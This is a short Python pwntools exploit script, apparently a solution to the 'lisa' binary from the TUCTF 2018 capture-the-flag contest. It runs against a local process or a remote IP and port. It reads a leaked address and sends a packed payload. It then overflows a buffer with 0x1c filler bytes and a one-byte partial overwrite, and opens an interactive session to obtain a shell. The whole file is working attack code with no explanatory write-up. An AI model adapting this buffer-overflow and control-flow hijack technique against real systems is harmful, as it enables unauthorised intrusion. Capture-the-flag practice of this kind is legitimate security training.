#!/usr/bin/env python
from pwn import *
import sys

HOST = '18.191.244.121'
PORT = 12345

def info(s):
	log.info(s)

def exploit(p):
	p.recvuntil('your share: ')
	l=int(p.recvline()[:-1],16)
	info("addr is 0x%x"%l)
	payload=p32(0)+p32(l)+p32(0x4)
	p.sendline(payload)
	info("payload lan 1 %s len 0x%x"%(payload,len(payload)))
	payload1='a'*0x1c
	payload1+='\x15'
	info("payload lan 2: %s len 0x%x"%(payload1,len(payload1)))
	
	p.send(payload1)
	p.sendline(p32(0))
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('/home/khongtrang/share/2018/tuctf/lisa')
		print util.proc.pidof(p)
		pause()
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)